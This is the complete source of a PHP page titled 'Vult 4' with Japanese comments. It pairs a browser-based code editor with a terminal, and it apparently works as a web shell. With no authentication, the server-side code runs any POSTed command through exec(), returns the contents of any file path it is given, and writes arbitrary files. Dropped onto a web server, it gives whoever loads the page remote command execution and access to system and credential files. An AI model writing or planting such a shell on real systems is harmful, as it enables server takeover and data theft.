<?php
if (isset($_POST['editor_content'], $_POST['file_name']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $file_name = preg_replace('/[^a-zA-Z0-9_.-]/', '_', $_POST['file_name']);
    file_put_contents($file_name, $_POST['editor_content']);
    echo "File saved:." . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']);
    $output = [];
    $returnValue = null;
    exec($command . ' 2>&1', $output, $returnValue);

    if ($returnValue === 0) {
        echo implode("\n", $output) . "\n";
    } else if (empty($output)) {
        echo "Command failed to execute and produced no output.\n";
    } else {
        echo "Error: " . implode("\n", $output) . "\n";
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loadFile'])) {
    $fileName = $_POST['loadFile'];
    if (file_exists($fileName) && is_readable($fileName)) {
        echo file_get_contents($fileName);
    } else {
        echo "Error: Cannot open the file. Please check the file name and try again.";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Vult 4</title>
    <style>
        body {
            font-family: monospace;
        }
        #file-operations, #editor, #terminal {
            width: 100%;
            margin-bottom: 10px;
        }
        #editor {
            background-color: #272822;
            color: #f8f8f2;
            border: none;
            padding: 10px;
            margin: 0;
            width: 100%;
            height: 45vh;
            box-sizing: border-box;
            resize: none;
            outline: none;
        }
        #terminal {
            width: 100%;
            height: 45vh;
            background-color: #2e2e2e;
            color: lime;
            padding: 10px;
            box-sizing: border-box;
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-wrap: break-word;
            overflow-y: auto;
        }
        #terminal-input {
            width: 95%;
            border: none;
            background-color: #5c5c5c;
            color: lime;
            margin-top: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }
        pre {
            white-space: pre-wrap; /* CSS 3 */
            white-space: -moz-pre-wrap;
        }
    </style>
</head>
<body>

<div id="file-operations">
    <label for="file-name"></label><input type="text" id="file-name">
    <button id="save-button">Save</button>
    <button id="load-button">Load</button>
    <button id="download-button">Download</button>
<!--    todo <button id="upload-button">Upload</button>-->
    <label id="file-condition"></label>
</div>

<label for="editor"></label><textarea id="editor" placeholder="Enter the code here..."></textarea>
<div id="terminal">
    <div id="terminal-output"></div>
    <label for="terminal-input">$ </label><input type="text" id="terminal-input" autofocus>
</div>

<script>
    let isFileSaved = false; // ファイルが保存されたかどうかのフラグ
    const editor = document.getElementById('editor');
    editor.addEventListener('keydown', function(e) {
        if (e.key === 'Tab') {
            e.preventDefault(); // デフォルトのTabキーの動作をキャンセル
            let start = this.selectionStart;
            let end = this.selectionEnd;


            const tab = '  ';
            this.value = this.value.substring(0, start) + tab + this.value.substring(end);

            this.selectionStart = this.selectionEnd = start + tab.length;
        }
    });

    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('load-button').addEventListener('click', function() {
            const fileName = document.getElementById('file-name').value;
            if (fileName) {
                fetch('<?php echo $_SERVER["PHP_SELF"]; ?>', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'loadFile=' + encodeURIComponent(fileName)
                })
                    .then(response => response.text())
                    .then(data => {
                        if (data.startsWith('Error')) {
                            alert(data);
                        } else {
                            document.getElementById('editor').value = data;
                            isFileSaved = true;
                        }
                    })
                    .catch(error => {
                        alert('Error: ' + error.message);
                    });
            } else {
                alert('Please enter a file name.');
            }
        });
    });

    // 保存ボタンのイベントハンドラ
    document.getElementById('save-button').addEventListener('click', function() {
        const fileName = document.getElementById('file-name').value;
        const editorContent = document.getElementById('editor').value;
        // ファイル名とエディタの内容をサーバーに送信
        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'file_name=' + encodeURIComponent(fileName) + '&editor_content=' + encodeURIComponent(editorContent)
        })
            .then(response => response.text())
            .then((response) => {
                // コンディションラベルにファイル名を表示
                document.getElementById('file-condition').textContent = fileName;
                isFileSaved = true; // ファイルが保存されたというフラグを立てる
            });
    });

    // エディタの内容が変更されたらコンディションラベルを更新
    document.getElementById('editor').addEventListener('input', function() {
        if (isFileSaved) {
            // 一度保存された後に編集が行われた場合、ラベルに * を追加
            document.getElementById('file-condition').textContent = document.getElementById('file-name').value + '*';
        }
    });

    const input = document.getElementById('terminal-input');
    const outputDiv = document.getElementById('terminal-output');

    input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            const command = this.value.trim();
            if (command) {
                outputDiv.innerHTML += "$ " + command + "\n";
                this.value = '';

                fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'command=' + encodeURIComponent(command)
                })
                    // terminal-outputへの出力部分
                    .then(response => response.text())
                    .then((text) => {
                        let pre = document.createElement('pre');
                        pre.textContent = text;
                        outputDiv.appendChild(pre);
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    })
                    .catch((error) => {
                        outputDiv.innerHTML += "Error: " + error.message;
                    });
            }
        }
    });

    function download(filename, text) {
        let element = document.createElement('a');
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
        element.setAttribute('download', filename);

        element.style.display = 'none';
        document.body.appendChild(element);

        element.click();

        document.body.removeChild(element);
    }

    document.getElementById('download-button').addEventListener('click', function() {
        const filename = document.getElementById('file-name').value;
        const text = document.getElementById('editor').value;
        download(filename, text);
    });
</script>
</body>
</html>
